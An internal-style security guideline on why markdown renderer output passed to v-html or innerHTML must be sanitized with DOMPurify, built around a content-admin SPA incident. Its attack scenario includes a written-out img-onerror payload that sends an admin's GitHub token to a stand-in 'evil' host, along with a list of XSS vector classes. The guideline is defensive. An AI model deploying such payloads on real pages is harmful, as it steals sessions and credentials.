---
title: 'Markdown output is attacker HTML until sanitized'
category: platform
summary: 'marked, markdown-it and friends do not sanitize; their output injected via v-html / innerHTML is stored XSS for anyone who can write content. Sanitize at the injection point with DOMPurify.'
principle: 'Every string that reaches v-html / innerHTML / dangerouslySetInnerHTML passes through DOMPurify at the injection boundary — no exceptions for "trusted" content, because the content authors are a different privilege level than the content readers.'
severity: non-negotiable
tags: [platform, xss, markdown, dompurify, vue, security]
sources:
  - project: 'a content-admin SPA'
    date: 2026-06-11
    note: 'Editor-written markdown rendered through marked + v-html with no sanitizer; preview ran in chief-editor/admin sessions with the GitHub token in localStorage. Editor → org-admin escalation in one crafted post.'
related:
  - platform/proxy-must-pin-targets
  - platform/origin-scoped-storage-privacy
order: 6
updated: 2026-06-11
---

Markdown renderers stopped shipping sanitizers years ago. `marked` deprecated its
`sanitize` option in 2018 and then removed it, and the docs say plainly that output
should be treated as untrusted. The mental model "markdown is just text formatting"
outlives that change, so `v-html="md.parse(content)"` keeps getting written.

A content-admin SPA (2026-06-11) had exactly this. The editor's preview pane piped
`marked` output into `v-html` with no sanitizer anywhere in the dependency tree, and a
custom raw-HTML renderer for media tags passed HTML blocks straight through on top of
that. Two facts turn it from theoretical into critical. First, writers and readers sit
at different privilege levels: editor-role users write the blog content, while chief
editors and admins review it in the same preview pane. Second, the session being
exposed is valuable, since the admin's GitHub token lived in localStorage with `repo`
and `admin:org` scopes.

A low-privilege editor commits a post containing
`<img src=x onerror="fetch('https://evil/?t='+localStorage.gh_token)">`, asks for
review, and harvests an org-admin token. Stored XSS, with the org's own review workflow
acting as the delivery channel.

## How to apply

Sanitize at the injection point, the last function the string passes through before
the framework hands it to the DOM:

```ts
import DOMPurify from 'dompurify'

// Default config + blob: URIs (asset previews use object URLs).
const URI_ALLOW =
  /^(?:(?:(?:f|ht)tps?|mailto|tel|blob|callto|sms|cid|xmpp):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i

export const sanitizeHtml = (html: string): string =>
  DOMPurify.sanitize(html, { ALLOWED_URI_REGEXP: URI_ALLOW })
```

```vue
const html = computed(() =>
  sanitizeHtml(m.parse(props.content, { async: false }))
)
```

Two practical notes from the same fix:

- **DOMPurify's default URI policy blocks `blob:`.** If your preview resolves
  relative asset paths to object URLs, extend the regexp or the images vanish. The
  default policy still passes relative paths and `#anchors` through the non-alpha
  branch, so footnote links and `./assets/` references survive untouched.
- **Custom renderers are part of the surface.** A marked extension with an
  `html({ text })` hook that returns the text is an explicit raw-HTML pass-through.
  The sanitizer has to run *after* every renderer, which is the reason the boundary
  is the injection point rather than somewhere inside the pipeline.

## Anti-patterns

```ts
// "Content comes from our own repo, it's trusted."
// Your editors are not your admins. Privilege boundary crossed.
<article v-html="marked.parse(content)" />

// Sanitizing input instead of output: the renderer itself can
// construct executable HTML from "safe" markdown constructs.
const safe = stripScriptTags(markdown) // then parse — still XSS
```

The second one fails because sanitizing *markdown* is not the same as sanitizing
*HTML*. Things like `[x](javascript:alert(1))`, reference-style tricks, and renderer
extensions all materialise after your strip has already run.

## Enforcement

Write a unit test per vector class, asserting on the sanitizer's output: `<script>`,
`onerror=`, `javascript:` hrefs, `<iframe>`, `data:` URLs. Add the positive cases your
feature needs too (blob previews, media tags, footnote anchors), so nobody "fixes" a
broken preview by deleting the sanitizer. A strict CSP (`script-src 'self'`) is the
defence-in-depth layer behind that, not a replacement for it.
